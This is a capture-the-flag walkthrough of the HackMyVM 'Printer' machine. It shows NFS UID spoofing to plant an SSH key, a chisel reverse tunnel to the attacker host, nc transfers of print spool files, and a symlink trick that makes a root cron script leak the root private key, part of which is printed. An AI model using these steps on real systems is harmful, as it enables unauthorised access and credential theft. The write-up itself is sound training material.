---
layout: post
title: "HackMyVM - Printer"
date: 2023-01-27 00:00:00 +0100
categories: hmv
tag: ["PortForward", "CUPS", "PJL", "LogPoison"]
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Hard
Release Date: 2023-01-23

## Scan & Enumeration

```bash
$ nmap -sC -sV -oA nmap/Printer -p- 192.168.1.11 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-27 00:48 WET
Nmap scan report for 192.168.1.11
Host is up (0.00036s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1896ad8971037f6c8ba1d283ca6f0e56 (RSA)
|   256 a41fbf9b2dccf682781c72bc319f7dfb (ECDSA)
|_  256 6af6fcffe8b862577c684d6ae3f449ce (ED25519)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      47932/udp   mountd
|   100005  1,2,3      50378/udp6  mountd
|   100005  1,2,3      58447/tcp   mountd
|   100005  1,2,3      58941/tcp6  mountd
|   100021  1,3,4      37451/tcp   nlockmgr
|   100021  1,3,4      39353/tcp6  nlockmgr
|   100021  1,3,4      40926/udp   nlockmgr
|   100021  1,3,4      50219/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
36453/tcp open  mountd   1-3 (RPC #100005)
37451/tcp open  nlockmgr 1-4 (RPC #100021)
43823/tcp open  mountd   1-3 (RPC #100005)
58447/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.71 seconds
```

### RPC Services

```bash
$ rpcinfo -p 192.168.1.11        
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  43998  mountd
    100005    1   tcp  50543  mountd
    100005    2   udp  34705  mountd
    100005    2   tcp  44719  mountd
    100005    3   udp  56026  mountd
    100005    3   tcp  40329  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
    100003    3   udp   2049  nfs
    100227    3   udp   2049  nfs_acl
    100021    1   udp  36134  nlockmgr
    100021    3   udp  36134  nlockmgr
    100021    4   udp  36134  nlockmgr
    100021    1   tcp  38305  nlockmgr
    100021    3   tcp  38305  nlockmgr
    100021    4   tcp  38305  nlockmgr
                                                                                                                                                                      
$ showmount -e 192.168.1.11
Export list for 192.168.1.11:
/home/lisa *
```

## User Lisa

* Make User LISA, Change UID to NFS SHARE

```bash

$ sudo mkdir /mnt/lisa

$ sudo mount -t nfs printer.hmv:/home/lisa /mnt/lisa

$ cd lisa

$ ls -la 

total 32
drwxr-xr-x 4 1098 adok 4096 Jan  8 11:58 .
drwxr-xr-x 3 root root 4096 Jan 30 23:29 ..
lrwxrwxrwx 1 root root    9 Jan  7 09:39 .bash_history -> /dev/null
-rw-r--r-- 1 1098 adok  220 Jan  7 09:33 .bash_logout
-rw-r--r-- 1 1098 adok 3555 Jan  7 17:26 .bashrc
drwxr-xr-x 3 1098 adok 4096 Jan  7 10:17 .local
-rw-r--r-- 1 1098 adok  807 Jan  7 09:33 .profile
drwx------ 2 1098 adok 4096 Jan  8 11:28 .ssh
-rwx------ 1 1098 adok   33 Jan  7 09:39 user.txt

$ sudo useradd -p test -s /bin/bash -M -u 1098 test
                                                                                                                                                                      
$ ls -la
total 32
drwxr-xr-x 4 test adok 4096 Jan  8 11:58 .
drwxr-xr-x 3 root root 4096 Jan 30 23:29 ..
lrwxrwxrwx 1 root root    9 Jan  7 09:39 .bash_history -> /dev/null
-rw-r--r-- 1 test adok  220 Jan  7 09:33 .bash_logout
-rw-r--r-- 1 test adok 3555 Jan  7 17:26 .bashrc
drwxr-xr-x 3 test adok 4096 Jan  7 10:17 .local
-rw-r--r-- 1 test adok  807 Jan  7 09:33 .profile
drwx------ 2 test adok 4096 Jan  8 11:28 .ssh
-rwx------ 1 test adok   33 Jan  7 09:39 user.txt

$ sudo su test                                     

test@valakas:/mnt/lisa$ ls .ssh/
id_rsa.pub
```

* Send Public Key

```bash
test@valakas:/mnt/lisa/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCaEiPBtYq9rI1tqnBBW8awhBZ6/td5EcIBykTYk7J9cOL3s33+e
[REDACTED]
crPLvKEVY6ZjXD84CxpqETiqp7/mlrBVqfr0/AQCUgk7mIAbpvs0AlaO+X5qHp9v4w== adok@valakas" > authorized_keys

$ ssh lisa@192.168.1.13     
lisa@printer:~$ 
```


## Port Forward CUPS

* Local

```bash
$ ./chisel server -p 9000 --reverse
2023/01/27 21:56:50 server: Reverse tunnelling enabled
2023/01/27 21:56:50 server: Fingerprint NmAJUffq+fcOa6rhK80RHheJOJo84TQHW8E03t+lt9s=
2023/01/27 21:56:50 server: Listening on http://0.0.0.0:9000
2023/01/27 21:56:51 server: session#1: tun: proxy#R:631=>631: Listening
```

* Remote

```bash
$ ./chisel client 192.168.1.6:9000 R:631:127.0.0.1:631
2023/01/27 22:56:48 client: Connecting to ws://192.168.1.6:9000
2023/01/27 22:56:48 client: Connection error: dial tcp 192.168.1.6:9000: connect: connection refused
2023/01/27 22:56:48 client: Retrying in 100ms...
2023/01/27 22:56:51 client: Connected (Latency 1.502141ms)
```

## nsecure

```bash
#! /bin/bash

dst=/opt/logs
journal=$dst/journal
queued=/var/spool/cups
str="*log*"

touch $journal
chmod 700 $journal
find -L /var/log -type f -name "$str" -exec cp {} $dst  \;
find -L /opt -type f -name "$str" -exec cat {} >> $dst/journal \;
rm $dst/$str

if grep -q "fatal error !" $dst/journal ; then
  umask 007 $queued
  lp -d superPrinter $dst/journal
  umask 022
  zip -P $(<~/.lisaPass) -j $journal.zip $queued/d*
  rm -f $queued/{d*,c*}
  >/var/log/syslog
  >/var/log/user.log
  echo "Lisa, URGENT! Come quickly to fix the problem!" |wall
fi

rm $journal
```

### /var/spool/cups

```bash
lisa@printer:~$ cd /var/spool/cups/
lisa@printer:/var/spool/cups$ ls -la
total 52
drwxr-x---+ 3 root lp       4096 Jan 30 22:51 .
drwxr-xr-x  6 root lpadmin  4096 Jan  8 10:21 ..
-rw-r--r--  1 root root     7921 Jan  8 10:33 18358014
-rw-r--r--  1 root root    13699 Jan  8 10:34 21581476
-rw-------  1 root lp       1100 Jan 30 22:51 c00052
-rw-------  1 root lp        956 Jan 27 23:12 c00053
-rw-r-----  1 root lp         33 Jan 27 23:11 d00052-001
-rw-r-----  1 root lp         33 Jan 27 23:11 d00053-001
drwxrwx--T  2 root lp       4096 Jan 30 22:51 tmp

lisa@printer:/var/spool/cups$ file *
18358014:   HP Printer Job Language data
21581476:   HP Printer Job Language data
c00052:     regular file, no read permission
c00053:     regular file, no read permission
d00052-001: ASCII text
d00053-001: ASCII text
tmp:        sticky, directory

```

## [Init Printer PJL jobs](https://en.wikipedia.org/wiki/Printer_Job_Language)

### 1st Printer

* Remote

```bash
lisa@printer:/var/spool/cups$ nc -vlnp 4444 < 18358014
listening on [any] 4444 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.6] 42658
lisa@printer:/var/spool/cups$
```

* Local

```bash
$ nc printer.hmv 4444 > 1.pcl
```

### 2nd Printer

```bash
lisa@printer:/var/spool/cups$ nc -vlnp 4444 < 21581476
listening on [any] 4444 ...
connect to [192.168.1.11] from (UNKNOWN) [192.168.1.6] 42658
lisa@printer:/var/spool/cups$
```

* Local

```bash
$ nc printer.hmv 4444 > 2.pcl
```

```bash
$ ls -la *.pcl         
-rw-r--r-- 1 adok adok  7921 Jan 30 22:13 1.pcl
-rw-r--r-- 1 adok adok 13699 Jan 30 22:14 2.pcl
```

## [Covert PCL 2 PDF](https://www.pdfconvertonline.com/pcl-to-pdf-online.html)

1.PCL > icetm-e06wu.pdf

2.PCL > iwu63-ioe5a 1.pdf

PASSWORD : 1154p455!1

```bash
echo "1154p455!1" > /home/lisa/pass
```

## ROOT

```bash
lisa@printer:~$ cat /opt/logs/nsecure 
#! /bin/bash

dst=/opt/logs
journal=$dst/journal
queued=/var/spool/cups
str="*log*"

touch $journal
chmod 700 $journal
find -L /var/log -type f -name "$str" -exec cp {} $dst  \;
find -L /opt -type f -name "$str" -exec cat {} >> $dst/journal \;
rm $dst/$str

if grep -q "fatal error !" $dst/journal ; then
  umask 007 $queued
  lp -d superPrinter $dst/journal
  umask 022
  zip -P $(<~/.lisaPass) -j $journal.zip $queued/d*
  rm -f $queued/{d*,c*}
  >/var/log/syslog
  >/var/log/user.log
  echo "Lisa, URGENT! Come quickly to fix the problem!" |wall
fi

rm $journal
lisa@printer:~$
```

* "fatal error !"

```bash 
isa@printer:~$ ln -s /root/.ssh/id_rsa .rsa_log

lisa@printer:~$ ls -la
total 48
drwxr-xr-x 6 lisa lisa 4096 Jan 30 23:53 .
drwxr-xr-x 3 root root 4096 Jan  7 10:33 ..
lrwxrwxrwx 1 root root    9 Jan  7 10:39 .bash_history -> /dev/null
-rw-r--r-- 1 lisa lisa  220 Jan  7 10:33 .bash_logout
-rw-r--r-- 1 lisa lisa 3555 Jan  7 18:26 .bashrc
drwx------ 2 lisa lisa 4096 Jan 27 23:16 .cups
drwxr-xr-x 3 lisa lisa 4096 Jan  7 11:17 .local
-rw-r--r-- 1 lisa lisa   11 Jan 30 23:33 pass
-rw-r--r-- 1 lisa lisa  807 Jan  7 10:33 .profile
lrwxrwxrwx 1 lisa lisa   17 Jan 30 23:53 .rsa_log -> /root/.ssh/id_rsa
drwx------ 2 lisa lisa 4096 Jan 27 04:17 .ssh
drwxr-xr-x 2 lisa lisa 4096 Jan 27 22:55 tmp
-rw-r--r-- 1 lisa lisa    0 Jan 27 23:09 user.pdf
-rwx------ 1 lisa lisa   33 Jan  7 10:39 user.txt
-rw-r--r-- 1 lisa lisa  215 Jan 27 05:20 .wget-hsts

lisa@printer:/opt$ logger "fatal error !"
lisa@printer:/opt$ cd logs/
                                                                               
Broadcast message from root@printer (somewhere) (Mon Jan 30 23:58:01 2023):    
                                                                               
Lisa, URGENT! Come quickly to fix the problem!                                 
                                                                               
lisa@printer:/opt/logs$ watch -n1 ls -l

Every 1.0s: ls -l                                                                                                                     printer: Tue Jan 31 00:00:44 2023

total 700
-rw-r--r-- 1 root root 711972 Jan 30 23:58 journal.zip
-rwxr-xr-x 1 root root    565 Jan  8 12:02 nsecure

lisa@printer:/opt/logs$ unzip journal.zip -d /tmp
Archive:  journal.zip
[journal.zip] d00052-001 password: 
 extracting: /tmp/d00052-001         
 extracting: /tmp/d00053-001         
  inflating: /tmp/d00054-001         
  inflating: /tmp/d00055-001         
  inflating: /tmp/d00056-001         
lisa@printer:/opt/logs$

lisa@printer:/opt/logs$ cd /tmp
lisa@printer:/tmp$ ls -la
total 4820
drwxrwxrwt 10 root root    4096 Jan 31 00:03 .
drwxr-xr-x 18 root root    4096 Jan  7 21:19 ..
-rw-r-----  1 lisa lisa      33 Jan 27 23:11 d00052-001
-rw-r-----  1 lisa lisa      33 Jan 27 23:11 d00053-001
-rw-r-----  1 lisa lisa 1685879 Jan 30 23:55 d00054-001
-rw-r-----  1 lisa lisa 1597254 Jan 30 23:56 d00055-001
-rw-r-----  1 lisa lisa 1598342 Jan 30 23:58 d00056-001

```

```bash
lisa@printer:/tmp$ cat d00052-001 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
[REDACTED]
WeRxvbgoEBPYoO/OgD42Wqzarp1hBI2IScE9M1HVE/SO+/85OBgZyDVeOfCIev62oQQTmO
913trazGIjB2PILmBi9FBkm4aw8fN142OWqvOcOPoClcK8G2i0WqaumfqT9LoAicWbtmoN
QTVrZgcBNsoB/FAAAADHJvb3RAcHJpbnRlcgECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

```bash
lisa@printer:/tmp$ mkdir rsa
lisa@printer:/tmp$ chmod 700 rsa/
lisa@printer:/tmp$ mv id_rsa rsa/
lisa@printer:/tmp$ chmod 600 rsa/id_rsa 
lisa@printer:/tmp$ cd rsa/
lisa@printer:/tmp/rsa$ ssh -i id_rsa root@192.168.1.13
Linux printer 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
Last login: Wed Jan 25 07:28:04 2023 from 192.168.0.10
root@printer:~# 
```
